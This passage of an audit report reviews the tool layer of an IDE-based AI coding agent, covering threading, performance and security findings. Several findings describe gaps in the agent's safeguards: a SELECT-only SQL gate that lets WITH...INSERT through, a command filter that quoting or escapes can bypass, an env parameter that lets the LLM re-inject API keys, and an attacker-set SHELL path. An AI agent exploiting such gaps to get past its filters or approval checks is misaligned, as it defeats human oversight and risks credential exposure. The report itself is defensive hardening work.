## F-21 — `DbQueryTool` prefix-based SELECT-only gate is bypassable via `WITH ... INSERT`

**Severity:** P2 correctness (called out by the tool itself)
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/database/DbQueryTool.kt:161`

Self-noted in tool docs ("downside" line 161): the prefix gate accepts `WITH … SELECT` but the same prefix admits `WITH … INSERT`/`UPDATE`. Defense-in-depth (`isReadOnly=true` + `autoCommit=false` + final rollback) does the actual work. **Status: known**, not a fresh finding — included here so the audit report carries a complete inventory.

`DatabaseConnectionManager.validateReadOnly` is the prefix-gate implementation (called at line 195 of DbQueryTool). The 14 blocked prefixes (INSERT/UPDATE/DELETE/...) don't include `WITH` — by design — but the doc acknowledges the gap. Production risk depends on JDBC driver honoring `isReadOnly`; most major drivers do (PG, MySQL, MSSQL with proper config), SQLite ignores it (read-only via URL flag only).

---

## F-22 — `SearchCodeTool` and `GlobFilesTool` do not honour `.gitignore`; results leak vendored / generated files

**Severity:** P2 correctness
**Files:**
- `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/SearchCodeTool.kt:208-213`
- `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/GlobFilesTool.kt:110-114`

Both tools use a hard-coded `SKIP_DIRS = {.git, .idea, node_modules, target, build, .gradle, .worktrees, .workflow, out, dist, .svn, .hg, __pycache__, .tox, .mypy_cache, api-debug}`. They do not parse the project's `.gitignore`. Common omissions:
- `vendor/` (Go, PHP)
- `Pods/` (iOS CocoaPods)
- `target/generated-sources/` (matched only through `target/` prefix; subtrees outside `target/` like `src/generated/` are not skipped)
- `tmp/`, `.cache/`, `.next/`, `.nuxt/`, `coverage/`, `htmlcov/`
- Custom org-specific output dirs from project `.gitignore`.

Token waste + noisy LLM results. Both tools self-document this downside.

---

## F-23 — Tool docs (per-tool DSL) are computed eagerly per registration — startup cost

**Severity:** P2 performance
**File:** All tool implementations override `documentation(): ToolDocumentation = toolDoc("name") { ... }`. The DSL `toolDoc` block is invoked on every call to `documentation()`. If callers (UI tabs, ToolDocPayloadBuilder) cache, no impact. But the rich docs total many MB of strings across ~80 tools — verify caching.

Checked: `ToolDocPayloadBuilder` reads via `tool.documentation()` per render; the per-tool DSL is re-evaluated. With ~80 tools and Kotlin lambda creation overhead, cold-start of the docs UI tab measurably stalls. Minor under typical use, but verify against `intellij-plugin-performance` startup-regression rules.

---

## F-24 — `RunCommandTool.streamCallback` is a top-level `@Volatile var`; one global slot for all sessions / tool calls

**Severity:** P2 architecture
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/RunCommandTool.kt:493-500`

```kotlin
@Volatile
var streamCallback: ((toolCallId: String, chunk: String) -> Unit)? = null

var currentToolCallId: ThreadLocal<String?> = ThreadLocal.withInitial { null }
```

`streamCallback` is a process-wide singleton. Multiple `AgentController` instances (e.g., the IDE has two projects open) overwrite each other's callbacks. The same applies to `SonarTool` reading `RunCommandTool.streamCallback` (line 1646 of SonarTool). With multi-project IDE usage, output streams cross-pollinate.

`currentToolCallId: ThreadLocal` is correct per-thread but doesn't survive `Dispatchers.IO` thread switching — the loop captures `RunCommandTool.currentToolCallId.get()` at execute-time (line 708) and uses it locally, so this is OK. The `streamCallback` global is the real hazard.

Self-noted at line 510-511 ("Remove once those tools are migrated to explicit parameters"). Migration pending.

---

## F-25 — `DeleteFileTool` only emits IntelliJ Local History via VFS; the I/O fallback skips it silently

**Severity:** P2 correctness
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/DeleteFileTool.kt:78,128-136`

```kotlin
val deleted = deleteViaVfs(resolvedPath, project, rawPath) || deleteViaFileIo(file)
```

`deleteViaVfs` wraps in `WriteCommandAction` (records Local History). `deleteViaFileIo` does `file.delete()` — no Local History. The user's safety promise ("recoverable via Edit → Local History → Show History") is asymmetric: succeed via VFS = recoverable; succeed via I/O fallback = permanent. The fallback triggers when VFS is unavailable (test contexts, but also any race where `LocalFileSystem.findFileByIoFile` returns null). No surfaced warning to the user or LLM.

---

## F-26 — `EditFileTool.preview` (companion-level) duplicates instance-level reading logic; potential drift

**Severity:** P2 quality
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/EditFileTool.kt:120-146, 437-462`

`preview()` (companion) and `findVirtualFile`/`readFileContent` (instance) are near-duplicates. The companion's variants are necessary because companion methods can't call instance methods. Any future encoding fix in `readFileContent` must be mirrored in `readFileContentForPreview` — pattern is fragile. Class-level static helpers (`object`) would let both call a single implementation.

---

## F-27 — `RunCommandTool` writes to `managed.outputLines` (ConcurrentLinkedQueue<String>) chunk-by-chunk; per-chunk allocation explodes with high-frequency output

**Severity:** P2 performance
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/RunCommandTool.kt:741-752`

```kotlin
val buffer = CharArray(4096)
var bytesRead = reader.read(buffer)
while (bytesRead != -1) {
    val chunk = String(buffer, 0, bytesRead)
    managed.outputLines.add(chunk)
    ...
}
```

Each read converts a CharArray to a `String` (allocation), then appends to a `ConcurrentLinkedQueue<String>`. For 100MB of `stdout` (verbose docker pull, gradle build), this is ~25K String objects, ~100MB heap pressure. The `OutputCollector.processOutputTailBiased` then iterates the queue and concatenates — second 100MB allocation. Self-bounded by the 600s timeout, but each invocation costs significant GC pressure.

`managed.outputLines.toList().joinToString("")` (line 828, 1005) creates the third copy.

**Recommended:** stream straight into a bounded ring buffer with a high-water mark.

---

## F-28 — `SubagentRunner` does not honor `withTimeoutOrNull` (tool timeoutMs = Long.MAX_VALUE)

**Severity:** P2 architecture
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/SpawnAgentTool.kt:232`

```kotlin
override val timeoutMs: Long get() = Long.MAX_VALUE  // No timeout — bounded by iterations + budget
```

Intentional (acknowledged in docstring "bounded by iterations + budget"). Sub-agent runs can pin for hours if the LLM provider is slow. The only externally-driven termination is `cancelAgent(agentId)` from the UI Kill button. No system-level hour cap. For deployments with cost controls (per-session budget), the agent loop's `contextBudget` is the de-facto limit (150K input tokens) — but a sub-agent can hammer the LLM with short queries indefinitely.

**Recommended:** add an `AgentSettings.subagentMaxRuntimeMinutes` (default e.g. 60) and enforce via `withTimeoutOrNull(maxRuntimeMs)` in `SubagentRunner.runInternal`.

---

## F-29 — JCEF UI Kill button path crosses `EDT → AgentController.cancelAgent → SpawnAgentTool.cancelAgent → runner.abort` without explicit dispatcher

**Severity:** P2 threading
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/SpawnAgentTool.kt:699-704`

```kotlin
fun cancelAgent(agentId: String): Boolean {
    val runner = runningAgents[agentId] ?: return false
    runner.abort()
    LOG.info("[SpawnAgent] Abort requested for subagent $agentId")
    return true
}
```

`runner.abort()` calls `brain.cancelActiveRequest()` which may invoke OkHttp `call.cancel()` — that path can do non-trivial work on the caller thread (interrupt readers, propagate cancellation). Called from the JCEF bridge on the EDT. The work itself is small, but defensive: any cancellation should pivot to `BackgroundPool` or `cs.launch`.

---

## F-30 — `ShellResolver.resolveBashExecutable` returns user-set `$SHELL` without validation — possible exec of attacker-set binary

**Severity:** P2 security (low)
**File:** `agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/process/ShellResolver.kt:139-145`

```kotlin
fun resolveBashExecutable(): String {
    if (File("/bin/bash").exists()) return "/bin/bash"
    val shellEnv = System.getenv("SHELL")
    if (!shellEnv.isNullOrBlank() && File(shellEnv).exists()) return shellEnv
    if (File("/bin/sh").exists()) return "/bin/sh"
    return "sh"
}
```

`$SHELL` is honored if it exists. On a multi-user box where an attacker exports `SHELL=/tmp/attacker/sh` into a target IDE's launch environment (e.g., via shell-rc injection on a shared workstation), the agent then execs the attacker's binary for every `run_command`. Low practical risk because the threat model assumes a single-user IDE, and the LLM is the agent driver — not an attacker controlling shell-rc. But the lookup is permissive.

**Recommended:** allowlist `$SHELL ∈ {/bin/bash, /usr/bin/bash, /usr/local/bin/bash, /bin/zsh, /usr/bin/zsh, /opt/homebrew/bin/bash}` or require the executable be in a system-owned path.

---

## Summary Table

| Finding | Severity | File:line | Category |
|---|---|---|---|
| F-1 | P0 threading | EditFileTool.kt:479,513 / CreateFileTool.kt:254 / DeleteFileTool.kt:114 | EDT freeze (invokeAndWaitIfNeeded) |
| F-2 | P0 resource | RevertFileTool.kt:133-138 | Blocking proc, no timeout, leak |
| F-3 | P0 security | DefaultCommandFilter.kt:43-58 + RunCommandTool.kt:637 | Shell-bypassable hard-block |
| F-4 | P0 security | ProcessEnvironment.kt:193-208 | User env re-injects sensitive vars |
| F-5 | P0 security | PathValidator.kt:87-93 | Symlink TOCTOU on write paths |
| F-6 | P0 security | SearchCodeTool.kt:255-259 | ReDoS / cancellation gap |
| F-7 | P1 correctness | EditFileTool.kt:482-490 | replace_all overlap miss |
| F-8 | P1 correctness | SpawnAgentTool.kt:919-1032 | No global sub-agent semaphore |
| F-9 | P1 resource | RuntimeExecTool.kt:1930-1991 | lsof/ss leak — no stderr drain |
| F-10 | P1 concurrency | ToolRegistry.kt:202-210,34-50 | Non-volatile cache fields |
| F-11 | P1 cancellation | SendStdinTool.kt:282-339 | Missing ensureActive |
| F-12 | P1 correctness | ToolOutputSpiller.kt:37 | epochSecond filename collisions |
| F-13 | P1 resource | HttpReadinessProbe.kt:128-170 | New HttpClient per probe; TOCTOU |
| F-14 | P1 security | RevertFileTool.kt:133 + Pytest/Pip/Poetry/Uv | Env not sanitised |
| F-15 | P1 correctness | ProcessRegistry.kt:132-155 | EDT-blocking kill (up to 7s) |
| F-16 | P1 threading | ProcessRegistry.kt:55-67 | Blocking stdin write |
| F-17 | P2 performance | RunCommandTool.kt:741-763 | Reader join leak; CoW stderr |
| F-18 | P2 correctness | RunCommandTool.kt:174-184 | Approval description LLM-controlled |
| F-19 | P2 correctness | SpawnAgentTool.kt:708-719 | Debug dir collision (low) |
| F-20 | P2 security | ToolOutputSpiller.kt:37-49 | Spill plaintext default perms |
| F-21 | P2 known | DbQueryTool.kt:161 | WITH...INSERT bypass (defense-in-depth catches) |
| F-22 | P2 correctness | SearchCodeTool.kt:208-213, GlobFilesTool.kt:110-114 | .gitignore not honoured |
| F-23 | P2 performance | All tool docs() | Per-call DSL eval |
| F-24 | P2 architecture | RunCommandTool.kt:493-500 | Process-wide streamCallback singleton |
| F-25 | P2 correctness | DeleteFileTool.kt:78,128-136 | I/O fallback skips Local History |
| F-26 | P2 quality | EditFileTool.kt:120-146 | Companion/instance read duplication |
| F-27 | P2 performance | RunCommandTool.kt:741-752 | String allocation explosion |
| F-28 | P2 architecture | SpawnAgentTool.kt:232 | No subagent wall-clock cap |
| F-29 | P2 threading | SpawnAgentTool.kt:699-704 | UI kill path on EDT |
| F-30 | P2 security (low) | ShellResolver.kt:139-145 | $SHELL allowed without allowlist |

**Severity totals:** P0 = 6, P1 = 10, P2 = 14. **Total: 30.**

---

## Top 5 Most Important

1. **F-3 — DefaultCommandFilter is shell-bypassable** — agent/src/main/kotlin/com/workflow/orchestrator/agent/security/DefaultCommandFilter.kt:43-58. Marketed as "hard-block pre-spawn" but circumvented by quoted args, variable expansion, single-char escape, or PowerShell. Either harden or downgrade the docs.
2. **F-4 — ProcessEnvironment user-env layer re-injects credentials** — agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/process/ProcessEnvironment.kt:193-208. `SENSITIVE_ENV_VARS` and `BLOCKED_ENV_VARS` are disjoint sets; LLM can re-add ANTHROPIC_API_KEY etc. via the `env` parameter.
3. **F-2 — RevertFileTool blocking ProcessBuilder, no timeout, no env sanitisation, leak on cancel** — agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/RevertFileTool.kt:133-138. Single line of code with five separate failure modes; canonical anti-pattern.
4. **F-1 — File write tools use invokeAndWaitIfNeeded on suspend path** — agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/EditFileTool.kt:479,513 (and CreateFile/DeleteFile). Documented EDT freezes; the agent-loop timeout can't interrupt the EDT slice.
5. **F-5 — PathValidator symlink TOCTOU on write paths** — agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/PathValidator.kt:87-93. Canonical check at validate-time, but the eventual write path re-resolves and can hit a swapped symlink. Use `NOFOLLOW_LINKS` or pre-resolved real path.

---

## Verdict

**Tool-stack hardening is solid in design but porous in implementation: the layered architecture (PathValidator, DefaultCommandFilter, ProcessEnvironment, per-tool timeoutMs, ApprovalGate, SessionApprovalStore) is correct on paper, but five P0 findings show the boundaries leak in practice — especially around shell command sanitisation, env-var re-injection, and the suspend/EDT bridge in write tools — so production deployment should treat the safety claims in CLAUDE.md and the tool docs as best-effort heuristics rather than guarantees until F-1 through F-6 are remediated.**

---

## Files Audited (representative sample of the 251 in scope)

### Read in full
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/AgentTool.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/ToolRegistry.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/ToolOutputSpiller.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/ToolOutputConfig.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/RunCommandTool.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/EditFileTool.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/CreateFileTool.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/DeleteFileTool.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/ReadFileTool.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/SearchCodeTool.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/GlobFilesTool.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/RevertFileTool.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/SendStdinTool.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/SpawnAgentTool.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/builtin/PathValidator.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/process/ShellResolver.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/process/ProcessEnvironment.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/process/ProcessRegistry.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/process/PromptHeuristics.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/runtime/HttpReadinessProbe.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/database/DbQueryTool.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/background/BackgroundPool.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/subagent/SubagentRunner.kt
- agent/src/main/kotlin/com/workflow/orchestrator/agent/security/DefaultCommandFilter.kt

### Read in part / scanned for findings
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/integration/SonarTool.kt (ProcessBuilder paths)
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/runtime/RuntimeExecTool.kt (port discovery)
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/database/DatabaseConnectionManager.kt (connection lifecycle)
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/framework/build/{PytestActions,PipActions,PoetryActions,UvActions}.kt (ProcessBuilder env sanitisation)
- agent/src/main/kotlin/com/workflow/orchestrator/agent/loop/AgentLoop.kt:1860-2060 (approval gate, withTimeoutOrNull plumbing)
- agent/src/main/kotlin/com/workflow/orchestrator/agent/tools/debug/AgentDebugController.kt (XDebuggerEvaluator path)
- agent/src/main/kotlin/com/workflow/orchestrator/agent/security/{CredentialRedactor,CommandFilter,CommandSafetyAnalyzer}.kt

### Greped across all 251 in-scope files
- `invokeAndWait` (5 matches in 4 files)
- `runBlocking` (none in tools — confirms CLAUDE.md ban hook is working)
- `ProcessBuilder` + `Runtime.exec` (10 matches across 8 files)
- `HttpClient` (HttpReadinessProbe primary)
- `Volatile` (1 — RunCommandTool.streamCallback)
- `evaluate` + `Evaluator` (XDebuggerEvaluator path in AgentDebugController only)
